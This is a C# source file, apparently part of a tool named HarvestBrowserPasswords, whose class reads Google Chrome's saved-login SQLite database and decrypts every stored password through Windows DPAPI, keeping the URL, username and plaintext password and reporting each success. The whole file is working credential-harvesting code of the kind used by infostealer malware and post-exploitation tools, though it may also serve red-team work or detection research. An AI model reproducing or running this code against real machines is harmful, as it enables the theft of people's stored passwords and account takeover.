using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using System.Security.Cryptography;

namespace HarvestBrowserPasswords
{
    public class ChromeDatabaseDecryptor
    {
        public string FilePath { get; set; }
        public string FormSubmitUrl { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }

        public  ChromeDatabaseDecryptor(string databaseFilePath)
        {
            FilePath = databaseFilePath;
            SQLiteConnection sqliteConnection = new SQLiteConnection(
                $"Data Source={FilePath};" +
                $"Version=3;" +
                $"New=True");

            try
            {

                sqliteConnection.Open();
                SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
                sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();

                //Iterate over each returned row from the query
                while (sqliteDataReader.Read())
                {
                    //Store columns as variables
                    FormSubmitUrl = sqliteDataReader.GetString(0);
                    //Avoid Printing empty rows
                    if (FormSubmitUrl == "")
                    {
                        continue;
                    }

                    Username = sqliteDataReader.GetString(1);
                    byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption

                    try
                    {
                        //DPAPI Decrypt - Requires System.Security.dll and using System.Security.Cryptography
                        byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
                        Password = Encoding.ASCII.GetString(decryptedBytes);
                        Console.WriteLine($"[+] Decrypted Google Chrome Credentials for {FormSubmitUrl}!");
                        /*
                        Console.WriteLine($"\tURL:      {FormSubmitUrl}");
                        Console.WriteLine($"\tUsername: {Username}");
                        Console.WriteLine($"\tPassword: {Password}");
                        */
                        
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[!] Error Decrypting Password: Exception {e}");
                    }
                }
    
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Error connecting to database: {FilePath}\nException: {e}");
            }

            sqliteConnection.Close();
        }
    }
}
